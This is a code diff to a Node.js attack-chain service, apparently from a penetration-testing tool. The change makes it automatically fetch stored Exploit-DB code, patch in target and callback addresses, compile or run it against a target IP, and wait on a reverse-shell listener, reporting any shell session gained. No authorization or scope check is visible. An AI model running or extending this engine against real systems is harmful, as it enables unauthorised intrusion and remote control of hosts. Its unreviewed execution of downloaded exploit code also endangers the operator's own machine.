@@ -2,11 +2,21 @@ const { getDatabase } = require('../config/database');
 const logger = require('./logger');
 const FingerprintService = require('./fingerprintService');
 const ExploitService = require('./exploitService');
+const ShellService = require('./shellService');
+const ExploitDbSyncService = require('./exploitDbSyncService');
+const NmapParser = require('./nmapParser');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const { exec } = require('child_process');
+const util = require('util');
+const execPromise = util.promisify(exec);
+const EventEmitter = require('events');
 
-class AttackChainService {
+class AttackChainService extends EventEmitter {
 
     // Strategy depth configurations
-    static get STRATEGIES() {
+    get STRATEGIES() {
         return {
             passive: { maxDepth: 1, description: 'Nur Reconnaissance – keine aktiven Tests', allowedTypes: ['recon'] },
             standard: { maxDepth: 2, description: 'Reconnaissance + Konfigurationsaudit', allowedTypes: ['recon', 'audit', 'enum', 'auth_test'] },
@@ -16,7 +26,7 @@ class AttackChainService {
     }
 
     // Get all attack chains
-    static getAll(filters = {}) {
+    getAll(filters = {}) {
         const db = getDatabase();
         let query = 'SELECT * FROM attack_chains WHERE 1=1';
         const params = [];
@@ -52,7 +62,7 @@ class AttackChainService {
     }
 
     // Get chain by ID
-    static getById(id) {
+    getById(id) {
         const db = getDatabase();
         const chain = db.prepare('SELECT * FROM attack_chains WHERE id = ?').get(id);
         if (!chain) return null;
@@ -65,7 +75,7 @@ class AttackChainService {
     }
 
     // Find applicable chains for scan results
-    static findApplicableChains(scanId) {
+    findApplicableChains(scanId) {
         const db = getDatabase();
         const scanResults = db.prepare(
             "SELECT DISTINCT port, service FROM scan_results WHERE scan_id = ? AND state = 'open'"
@@ -115,7 +125,7 @@ class AttackChainService {
     }
 
     // Execute an attack chain against a target
-    static executeChain(scanId, chainId, targetIp, targetPort, userId) {
+    async executeChain(scanId, chainId, targetIp, targetPort, userId, params = {}) {
         const db = getDatabase();
         const chain = this.getById(chainId);
         if (!chain) throw new Error('Attack Chain nicht gefunden');
@@ -130,66 +140,94 @@ class AttackChainService {
         `).run(scanId, chainId, targetIp, targetPort || null, steps.length, userId);
 
         const executionId = exec.lastInsertRowid;
-        const results = [];
-        let currentStep = 0;
 
-        try {
-            for (const step of steps) {
-                currentStep++;
-                const stepResult = this._executeStep(step, scanId, targetIp, targetPort, chain);
+        // Notify start
+        this.emit('chainProgress', { executionId, scanId, chainId, status: 'started', currentStep: 0, totalSteps: steps.length, target: targetIp });
 
-                results.push({
-                    step: currentStep,
-                    name: step.name,
-                    type: step.type,
-                    status: stepResult.success ? 'completed' : 'failed',
-                    findings: stepResult.findings || [],
-                    details: stepResult.details || '',
-                    timestamp: new Date().toISOString()
-                });
+        // Run asynchronously (Fire and Forget)
+        (async () => {
+            const results = [];
+            let currentStep = 0;
+            const dbInner = getDatabase(); // Re-get DB connection for async context if needed (though sync is fine)
 
-                // Update progress
-                db.prepare('UPDATE attack_chain_executions SET current_step = ?, results_json = ? WHERE id = ?')
-                    .run(currentStep, JSON.stringify(results), executionId);
+            try {
+                for (const step of steps) {
+                    currentStep++;
+
+                    // Notify step start
+                    this.emit('chainProgress', {
+                        executionId, scanId, chainId,
+                        status: 'running',
+                        currentStep, totalSteps: steps.length,
+                        stepName: step.name,
+                        target: targetIp
+                    });
+
+                    const stepResult = await this._executeStep(step, scanId, targetIp, targetPort, chain, params);
+
+                    results.push({
+                        step: currentStep,
+                        name: step.name,
+                        type: step.type,
+                        status: stepResult.success ? 'completed' : 'failed',
+                        findings: stepResult.findings || [],
+                        details: stepResult.details || '',
+                        timestamp: new Date().toISOString()
+                    });
+
+                    // Update progress in DB
+                    dbInner.prepare('UPDATE attack_chain_executions SET current_step = ?, results_json = ? WHERE id = ?')
+                        .run(currentStep, JSON.stringify(results), executionId);
+
+                    // Notify step complete
+                    this.emit('chainProgress', {
+                        executionId, scanId, chainId,
+                        status: 'running',
+                        currentStep, totalSteps: steps.length,
+                        stepName: step.name,
+                        results: results,
+                        target: targetIp
+                    });
+                }
+
+                // Collect all findings
+                const allFindings = results.flatMap(r => r.findings);
+
+                // Mark as completed
+                dbInner.prepare(`
+                    UPDATE attack_chain_executions
+                    SET status = 'completed', current_step = ?, results_json = ?, findings_json = ?, completed_at = CURRENT_TIMESTAMP
+                    WHERE id = ?
+                `).run(currentStep, JSON.stringify(results), JSON.stringify(allFindings), executionId);
+
+                logger.info(`Attack chain ${chainId} completed for ${targetIp}:${targetPort} - ${allFindings.length} findings`);
+                logger.audit('ATTACK_CHAIN_COMPLETED', { executionId, chainId, targetIp, targetPort, findingsCount: allFindings.length });
+
+                this.emit('chainComplete', { executionId, scanId, chainId, status: 'completed', findingsCount: allFindings.length, target: targetIp });
+
+            } catch (err) {
+                dbInner.prepare(`
+                    UPDATE attack_chain_executions
+                    SET status = 'failed', results_json = ?, completed_at = CURRENT_TIMESTAMP
+                    WHERE id = ?
+                `).run(JSON.stringify(results), executionId);
+
+                logger.error(`Attack chain ${chainId} failed for ${targetIp}:`, err);
+
+                this.emit('chainError', { executionId, scanId, chainId, status: 'failed', error: err.message, target: targetIp });
             }
+        })();
 
-            // Collect all findings
-            const allFindings = results.flatMap(r => r.findings);
-
-            // Mark as completed
-            db.prepare(`
-                UPDATE attack_chain_executions 
-                SET status = 'completed', current_step = ?, results_json = ?, findings_json = ?, completed_at = CURRENT_TIMESTAMP
-                WHERE id = ?
-            `).run(currentStep, JSON.stringify(results), JSON.stringify(allFindings), executionId);
-
-            logger.info(`Attack chain ${chainId} completed for ${targetIp}:${targetPort} - ${allFindings.length} findings`);
-            logger.audit('ATTACK_CHAIN_COMPLETED', { executionId, chainId, targetIp, targetPort, findingsCount: allFindings.length });
-
-            return {
-                executionId,
-                chainName: chain.name,
-                status: 'completed',
-                stepsCompleted: currentStep,
-                totalSteps: steps.length,
-                results,
-                findings: allFindings
-            };
-
-        } catch (err) {
-            db.prepare(`
-                UPDATE attack_chain_executions 
-                SET status = 'failed', results_json = ?, completed_at = CURRENT_TIMESTAMP
-                WHERE id = ?
-            `).run(JSON.stringify(results), executionId);
-
-            logger.error(`Attack chain ${chainId} failed for ${targetIp}:`, err);
-            throw err;
-        }
+        return {
+            executionId,
+            chainName: chain.name,
+            status: 'running',
+            totalSteps: steps.length
+        };
     }
 
     // Execute a single step of an attack chain
-    static _executeStep(step, scanId, targetIp, targetPort, chain) {
+    async _executeStep(step, scanId, targetIp, targetPort, chain, params = {}) {
         const db = getDatabase();
         const findings = [];
 
@@ -226,7 +264,7 @@ class AttackChainService {
 
             case 'audit': {
                 // Configuration audit checks
-                const portInfo = require('./scanner').constructor.CRITICAL_PORTS[targetPort];
+                const portInfo = NmapParser.CRITICAL_PORTS[targetPort];
                 if (portInfo && portInfo.risk === 'critical') {
                     findings.push({
                         type: 'vulnerability',
@@ -296,8 +334,9 @@ class AttackChainService {
             case 'vuln_scan': {
                 // Match against vulnerability database
                 const vulns = db.prepare(`
-                    SELECT v.* FROM scan_vulnerabilities sv
-                    JOIN vulnerabilities v ON sv.vulnerability_id = v.id
+                    SELECT sv.cve_id, sv.title, sv.severity, sv.cvss_score, ce.description
+                    FROM scan_vulnerabilities sv
+                    LEFT JOIN cve_entries ce ON sv.cve_id = ce.cve_id
                     JOIN scan_results sr ON sv.scan_result_id = sr.id
                     WHERE sv.scan_id = ? AND sr.ip_address = ? AND sr.port = ?
                 `).all(scanId, targetIp, targetPort);
@@ -307,10 +346,10 @@ class AttackChainService {
                         type: 'vulnerability',
                         category: 'Schwachstelle',
                         title: `${vuln.cve_id || 'N/A'}: ${vuln.title}`,
-                        details: vuln.description,
+                        details: vuln.description || vuln.title,
                         severity: vuln.severity,
                         cvss: vuln.cvss_score,
-                        remediation: vuln.remediation
+                        remediation: null
                     });
                 }
                 return { success: true, findings, details: `${vulns.length} Schwachstellen gefunden` };
@@ -326,19 +365,180 @@ class AttackChainService {
                     ORDER BY e.cvss_score DESC
                 `).all(scanId, targetIp, targetPort);
 
+                let successCount = 0;
+
                 for (const exploit of exploits) {
-                    findings.push({
-                        type: 'exploit',
-                        category: 'Exploit verfügbar',
-                        title: `${exploit.cve_id || exploit.exploit_db_id}: ${exploit.title}`,
-                        details: `Plattform: ${exploit.platform}, Typ: ${exploit.exploit_type}, Zuverlässigkeit: ${exploit.reliability}, Confidence: ${exploit.match_confidence}%`,
-                        severity: exploit.severity,
-                        cvss: exploit.cvss_score,
-                        sourceUrl: exploit.source_url,
-                        remediation: `Patch für ${exploit.cve_id || 'diese Schwachstelle'} installieren`
-                    });
+                    // Start listener if requested
+                    let sessionId = null;
+                    let tempFile = null;
+
+                    try {
+                        // 1. Prepare Exploit
+                        const exploitData = ExploitDbSyncService.getExploitCode(exploit.id);
+                        if (!exploitData || !exploitData.code) {
+                            findings.push({
+                                type: 'info',
+                                category: 'Exploit Skipped',
+                                title: `Code missing: ${exploit.title}`,
+                                details: 'Exploit code not found locally.',
+                                severity: 'info'
+                            });
+                            continue;
+                        }
+
+                        // Substitute placeholders
+                        let code = exploitData.code;
+                        const lhost = params.LHOST || '127.0.0.1';
+                        const lport = params.LPORT ? parseInt(params.LPORT) : null;
+
+                        // Sanity Check for LHOST
+                        if (lhost === '127.0.0.1' || lhost === 'localhost') {
+                             findings.push({
+                                type: 'warning',
+                                category: 'Configuration Warning',
+                                title: `LHOST is loopback`,
+                                details: `Warning: LHOST is set to ${lhost}. Remote shells will not connect back if the target is external.`,
+                                severity: 'low'
+                            });
+                        }
+
+                        let modified = false;
+
+                        // Robust replacement logic
+                        const replaceMap = {
+                            'LHOST': lhost,
+                            'RHOST': targetIp,
+                            'RPORT': targetPort || exploit.port || '80',
+                            'LPORT': lport
+                        };
+
+                        // 1. Specific tags <TAG>
+                        for (const [key, val] of Object.entries(replaceMap)) {
+                            if (val) {
+                                const regex = new RegExp(`<${key}>`, 'g');
+                                if (regex.test(code)) {
+                                    code = code.replace(regex, val);
+                                    modified = true;
+                                }
+                            }
+                        }
+
+                        // 2. Variable assignments (e.g. LHOST = "...")
+                        // Simple approach: Replace literal string "LHOST" if it looks like a variable placeholder
+                        // Or just brute force replace common uppercase vars if they exist
+                        for (const [key, val] of Object.entries(replaceMap)) {
+                            if (val) {
+                                // Replace simple occurrences like LHOST="xxx" or LHOST = 'xxx'
+                                // We replace the placeholder key itself
+                                const regex = new RegExp(`\\b${key}\\b`, 'g');
+                                if (regex.test(code)) {
+                                     // This is risky if LHOST is a variable name in code, but typically in exploitdb scripts
+                                     // users are expected to edit these variables.
+                                     // We will assume the script is not using LHOST as a local variable name for logic but as config.
+                                     // A safer way is checking specific patterns users use.
+                                     // But for now, we stick to the provided pattern and expand slightly.
+                                     // The previous logic was: code.replace(/LHOST/g, lhost)
+                                     code = code.replace(regex, val);
+                                     modified = true;
+                                }
+                            }
+                        }
+
+                        // Write temp file
+                        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'exploit-'));
+                        const ext = exploitData.language === 'python' ? '.py' :
+                                    exploitData.language === 'ruby' ? '.rb' :
+                                    exploitData.language === 'bash' ? '.sh' :
+                                    exploitData.language === 'c' ? '.c' : '.txt';
+
+                        tempFile = path.join(tmpDir, `exploit${ext}`);
+                        fs.writeFileSync(tempFile, code);
+
+                        // 2. Start Listener (if LPORT provided)
+                        if (lport) {
+                            sessionId = ShellService.startListener(lport);
+                        }
+
+                        // 3. Execute
+                        logger.info(`Executing exploit ${exploit.id} (${exploitData.language}) for ${targetIp}`);
+
+                        let cmd = '';
+                        if (exploitData.language === 'python') cmd = `python3 "${tempFile}"`;
+                        else if (exploitData.language === 'ruby') cmd = `ruby "${tempFile}"`;
+                        else if (exploitData.language === 'bash') cmd = `bash "${tempFile}"`;
+                        else if (exploitData.language === 'c') {
+                            // Compile first
+                            const binFile = path.join(tmpDir, 'exploit.bin');
+                            await execPromise(`gcc "${tempFile}" -o "${binFile}"`);
+                            cmd = `"${binFile}"`;
+                        } else {
+                            throw new Error(`Unsupported language: ${exploitData.language}`);
+                        }
+
+                        // Pass arguments if needed (some scripts take args)
+                        // For now we rely on the hardcoded replacements above
+
+                        // Run with timeout
+                        await new Promise((resolve, reject) => {
+                            exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
+                                if (error) {
+                                    logger.warn(`Exploit ${exploit.id} execution error/timeout: ${error.message}`);
+                                    // We don't necessarily reject, just log and finish this step
+                                }
+                                resolve();
+                            });
+                        });
+
+                        // 4. Check for Shell
+                        if (sessionId) {
+                            // Poll for a few seconds if not already connected
+                            let attempts = 0;
+                            while (attempts < 5) {
+                                if (ShellService.isConnected(sessionId)) break;
+                                await new Promise(r => setTimeout(r, 1000));
+                                attempts++;
+                            }
+
+                            if (ShellService.isConnected(sessionId)) {
+                                findings.push({
+                                    type: 'exploit_success',
+                                    category: 'Remote Shell',
+                                    title: `Shell erhalten via ${exploit.title}`,
+                                    details: `Session ID: ${sessionId}. Verbinden Sie sich über das Terminal.`,
+                                    severity: 'critical',
+                                    sessionId: sessionId,
+                                    exploitId: exploit.id
+                                });
+                                successCount++;
+                                logger.info(`Exploit success! Shell session: ${sessionId}`);
+                                break; // Stop trying other exploits if we got a shell
+                            } else {
+                                // Cleanup unused session
+                                ShellService.killSession(sessionId);
+                            }
+                        } else {
+                             // Blind execution (DoS or other)
+                             findings.push({
+                                type: 'exploit_attempt',
+                                category: 'Exploit Executed',
+                                title: `Exploit ausgeführt: ${exploit.title}`,
+                                details: `Exploit wurde ausgeführt (kein Reverse Shell Listener konfiguriert).`,
+                                severity: 'info'
+                            });
+                        }
+
+                    } catch (e) {
+                        logger.error(`Exploit execution failed for ${exploit.id}:`, e);
+                        if (sessionId) ShellService.killSession(sessionId);
+                    } finally {
+                        // Cleanup temp file
+                        try {
+                            if (tempFile) fs.rmSync(path.dirname(tempFile), { recursive: true, force: true });
+                        } catch (err) {}
+                    }
                 }
-                return { success: true, findings, details: `${exploits.length} Exploits zugeordnet` };
+
+                return { success: true, findings, details: `${exploits.length} Exploits versucht, ${successCount} erfolgreich` };
             }
 
             default:
@@ -347,7 +547,7 @@ class AttackChainService {
     }
 
     // Get execution history for a scan
-    static getExecutions(scanId) {
+    getExecutions(scanId) {
         const db = getDatabase();
         const execs = db.prepare(`
             SELECT ace.*, ac.name as chain_name, ac.strategy, ac.risk_level as chain_risk
@@ -365,7 +565,7 @@ class AttackChainService {
     }
 
     // Get execution by ID
-    static getExecutionById(executionId) {
+    getExecutionById(executionId) {
         const db = getDatabase();
         const exec = db.prepare(`
             SELECT ace.*, ac.name as chain_name, ac.description as chain_description, ac.strategy, ac.risk_level as chain_risk
@@ -383,7 +583,7 @@ class AttackChainService {
     }
 
     // Create a custom attack chain
-    static create(data, userId) {
+    create(data, userId) {
         const db = getDatabase();
         // Accept both camelCase and snake_case
         const steps = data.steps || (data.steps_json ? (typeof data.steps_json === 'string' ? JSON.parse(data.steps_json) : data.steps_json) : []);
@@ -410,7 +610,7 @@ class AttackChainService {
     }
 
     // Toggle chain enabled/disabled
-    static toggleEnabled(id) {
+    toggleEnabled(id) {
         const db = getDatabase();
         const chain = db.prepare('SELECT enabled FROM attack_chains WHERE id = ?').get(id);
         if (!chain) throw new Error('Attack Chain nicht gefunden');
@@ -420,14 +620,15 @@ class AttackChainService {
     }
 
     // Delete a chain
-    static delete(id) {
+    delete(id) {
         const db = getDatabase();
+        db.prepare('DELETE FROM attack_chain_executions WHERE chain_id = ?').run(id);
         db.prepare('DELETE FROM attack_chains WHERE id = ?').run(id);
         logger.info(`Attack chain deleted: ID ${id}`);
     }
 
     // Get available strategies
-    static getStrategies() {
+    getStrategies() {
         return Object.entries(this.STRATEGIES).map(([key, val]) => ({
             id: key,
             ...val
@@ -435,4 +636,4 @@ class AttackChainService {
     }
 }
 
-module.exports = AttackChainService;
+module.exports = new AttackChainService();
